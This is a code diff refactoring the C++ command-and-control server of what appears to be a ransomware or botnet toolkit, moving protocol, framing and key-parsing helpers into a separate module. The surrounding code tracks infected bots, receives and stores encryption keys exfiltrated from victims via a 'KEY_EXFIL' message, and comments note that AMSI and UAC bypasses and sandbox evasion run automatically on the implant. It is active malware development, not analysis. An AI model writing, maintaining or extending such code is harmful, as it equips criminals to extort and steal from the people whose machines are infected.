@@ -14,6 +14,7 @@
 #include <atomic>
 #include <memory>   // shared_ptr — per-thread done-flag (shutdown UAF fix)
 #include "crypto.h"   // ChaCha20-Poly1305 AEAD for transport encryption
+#include "rsw_protocol.h"  // SPLIT: stateless parse/transport layer (rsw::)
 
 #define CHUNK_SIZE 32768  // 32 KB chunks
 
@@ -30,6 +31,10 @@
 
 
 using namespace std;
+
+// SPLIT: stateless helpers moved to rsw:: (rsw_protocol.cpp) — this using-
+// directive keeps every existing unqualified call site unchanged.
+using namespace rsw;
 
 struct ClientInfo {
     int socket;
@@ -437,13 +442,6 @@ public:
         // AMSI and UAC bypasses are auto-executed by MWare.cpp after its initial
         // sandbox-evasion delay. No server-side command needed.
 
-    string trim(const string& text) {
-        size_t start = text.find_first_not_of(" \t\n\r");
-        if (start == string::npos) return "";
-        size_t end = text.find_last_not_of(" \t\n\r");
-        return text.substr(start, end - start + 1);
-    }
-
     void showBanner() {
         cout << "\033[1;31m" << endl; // Red color
         cout << R"( ______    ______   __ __ __             ______   _____       )" << endl;
@@ -546,39 +544,7 @@ public:
         #endif
     }
 
-    string formatTime(time_t timestamp) {
-        time_t now = time(nullptr);
-        int diff = (int)(now - timestamp);
-
-        if (diff < 60) return to_string(diff) + "s ago";
-        if (diff < 3600) return to_string(diff/60) + "m ago";
-        if (diff < 86400) return to_string(diff/3600) + "h ago";
-        return to_string(diff/86400) + "d ago";
-    }
-
-    // HEX encoding/decoding functions
-    string bytesToHex(const string& data) {
-        string hex_string;
-        hex_string.reserve(data.length() * 2);
-
-        for (unsigned char c : data) {
-            hex_string += "0123456789ABCDEF"[c >> 4];
-            hex_string += "0123456789ABCDEF"[c & 0x0F];
-        }
-        return hex_string;
-    }
-
-    string hexToBytes(const string& hex) {
-        string bytes;
-        bytes.reserve(hex.length() / 2);
-
-        for (size_t i = 0; i < hex.length(); i += 2) {
-            string byte_string = hex.substr(i, 2);
-            unsigned char byte = (unsigned char)strtol(byte_string.c_str(), nullptr, 16);
-            bytes.push_back(byte);
-        }
-        return bytes;
-    }
+    // SPLIT: formatTime() → rsw::formatTime (rsw_protocol.cpp)
 
     // Per-client transport encryption — ChaCha20-Poly1305 AEAD
     // Each message: nonce(12) || ciphertext || Poly1305-tag(16)
@@ -623,54 +589,7 @@ public:
         return string((char*)plaintext.data(), plaintext.size());
     }
 
-    // Wrap/unwrap transport protocol (matches client)
-    string wrapForTransport(const string& data) {
-        string wrapped;
-        size_t length = data.length();
-
-        wrapped += (char)((length >> 24) & 0xFF);
-        wrapped += (char)((length >> 16) & 0xFF);
-        wrapped += (char)((length >> 8) & 0xFF);
-        wrapped += (char)(length & 0xFF);
-
-        unsigned char checksum = 0;
-        for (char c : data) {
-            checksum ^= (unsigned char)c;
-        }
-        wrapped += (char)checksum;
-        wrapped += data;
-
-        return wrapped;
-    }
-
-    string unwrapFromTransport(const string& data) {
-        if (data.length() < 5) return data;
-
-        size_t length = ((unsigned char)data[0] << 24) |
-                       ((unsigned char)data[1] << 16) |
-                       ((unsigned char)data[2] << 8) |
-                       ((unsigned char)data[3]);
-
-        // 256MB cap — must exceed any legitimate frame (32KB chunk uploads
-        // hex-encode to >64KB, which the old 65536 cap truncated).
-        if (length > 0x0FFFFFFF || length > data.length() - 5) {
-            return data;
-        }
-
-        string extracted = data.substr(5, length);
-        unsigned char checksum = (unsigned char)data[4];
-
-        unsigned char calc_checksum = 0;
-        for (char c : extracted) {
-            calc_checksum ^= (unsigned char)c;
-        }
-
-        if (calc_checksum == checksum) {
-            return extracted;
-        }
-
-        return data;
-    }
+    // SPLIT: wrapForTransport/unwrapFromTransport → rsw:: (rsw_protocol.cpp)
 
     // Send encrypted command to client — framed (4-byte BE length + encrypted
     // payload) with a send-loop. The plaintext length prefix lets the bot
@@ -725,11 +644,7 @@ public:
         return true;
     }
 
-    string centerText(const string& text, int width) {
-        int padding = (width - (int)text.length()) / 2;
-        if (padding < 0) padding = 0;
-        return string(padding, ' ') + text + string(width - padding - (int)text.length(), ' ');
-    }
+    // SPLIT: centerText() → rsw::centerText (rsw_protocol.cpp)
 
     void listClients() {
         // ========================================================================
@@ -1184,32 +1099,24 @@ public:
                 // pending_response is updated only for genuine command responses.
                 bool is_key_exfil = (message.length() >= 10 && message.substr(0, 10) == "KEY_EXFIL:");
                 if (is_key_exfil) {
-                    // Format: KEY_EXFIL:bot_id|file_path|algo|key
-                    // '|' separators: file_path may contain ':' on Windows
-                    // (C:\...) — the old ':' split shifted algo/key extraction
-                    // into the path bytes on every Windows exfil.
-                    string payload = message.substr(10);
-                    size_t sep1 = payload.find('|');
-                    size_t sep2 = payload.find('|', sep1 + 1);
-                    size_t sep3 = payload.find('|', sep2 + 1);
+                    // SPLIT: parsing moved to rsw::parseKeyExfil (rsw_protocol.cpp).
+                    // '|' separators: file_path may contain ':' on Windows (C:\...)
+                    // — the old ':' split shifted algo/key extraction into the
+                    // path bytes on every Windows exfil.
+                    rsw::KeyExfil kx = rsw::parseKeyExfil(message);
 
-                    if (sep1 != string::npos && sep2 != string::npos && sep3 != string::npos) {
-                        string bot_id = payload.substr(0, sep1);
-                        string file_path = payload.substr(sep1 + 1, sep2 - sep1 - 1);
-                        string algo = payload.substr(sep2 + 1, sep3 - sep2 - 1);
-                        string key = payload.substr(sep3 + 1);
-
+                    if (kx.valid) {
                         // Build human-readable key info
-                        string key_info = "Algorithm: " + algo + " | Key: " + key;
+                        string key_info = "Algorithm: " + kx.algo + " | Key: " + kx.key;
 
                         // Store in exfiltrated_keys map (thread-safe)
                         {
                             std::lock_guard<std::mutex> klock(keys_mutex_);
-                            exfiltrated_keys[bot_id].push_back({file_path, key_info});
+                            exfiltrated_keys[kx.bot_id].push_back({kx.file_path, key_info});
                         }
 
-                        cout << "\033[1;32m[KEY_EXFIL] Captured key from " << bot_id << " for " << file_path << "\033[0m" << endl;
-                        cout << "\033[1;33m  Algorithm: " << algo << " | Key: " << key << "\033[0m" << endl;
+                        cout << "\033[1;32m[KEY_EXFIL] Captured key from " << kx.bot_id << " for " << kx.file_path << "\033[0m" << endl;
+                        cout << "\033[1;33m  Algorithm: " << kx.algo << " | Key: " << kx.key << "\033[0m" << endl;
                         cout << "\033[1;33m  Use 'show_key' command to view all captured keys\033[0m" << endl;
                     }
                     // Do NOT continue to pending_response storage — KEY_EXFIL is
@@ -2063,51 +1970,7 @@ public:
         return "TASK_" + to_string(task_counter++);
     }
 
-    time_t parseScheduleTime(const string& schedule_str) {
-        time_t now = time(nullptr);
-        struct tm* tm_now = localtime(&now);
-
-        if (schedule_str.find("*/") == 0) {
-            // Interval format: */N (every N minutes)
-            try {
-                int interval = stoi(schedule_str.substr(2));
-                if (interval <= 0) {
-                    // */0 or negative → next_run lands at/before 'now' on every
-                    // tick → scheduler would re-trigger the task forever.
-                    // Reject at creation instead.
-                    return 0;
-                }
-                return now + (interval * 60);
-            } catch (const exception&) {
-                return 0; // Invalid interval number
-            }
-        }
-        else if (schedule_str.find(":") != string::npos) {
-            // Daily format: HH:MM
-            size_t colon_pos = schedule_str.find(":");
-            try {                int hour = stoi(schedule_str.substr(0, colon_pos));
-                int minute = stoi(schedule_str.substr(colon_pos + 1));
-
-                struct tm target_tm = *tm_now;
-                target_tm.tm_hour = hour;
-                target_tm.tm_min = minute;
-                target_tm.tm_sec = 0;
-
-                time_t target_time = mktime(&target_tm);
-
-                // If time has passed today, schedule for tomorrow
-                if (target_time <= now) {
-                    target_time += 24 * 60 * 60;
-                }
-
-                return target_time;
-            } catch (const exception&) {
-                return 0; // Invalid hour/minute format
-            }
-        }
-
-        return 0; // Invalid format
-    }
+    // SPLIT: parseScheduleTime() → rsw::parseScheduleTime (rsw_protocol.cpp)
 
     void startScheduler() {
         scheduler_running = true;
